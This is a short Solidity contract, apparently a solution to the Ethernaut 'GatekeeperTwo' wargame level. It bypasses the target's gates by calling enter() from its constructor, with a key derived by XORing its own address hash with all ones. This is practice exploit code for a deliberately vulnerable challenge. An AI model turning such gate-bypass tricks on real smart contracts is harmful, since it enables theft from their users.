//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoHacker {
    
    constructor(IGatekeeperTwo _gatekeeperTwo) {

        bytes8 encodedAndCastedMsgSender = bytes8(keccak256(abi.encodePacked(address(this))));
        bytes8 _gateKey = encodedAndCastedMsgSender ^ 0xFFFFFFFFFFFFFFFF;

        _gatekeeperTwo.enter(_gateKey);
    }
}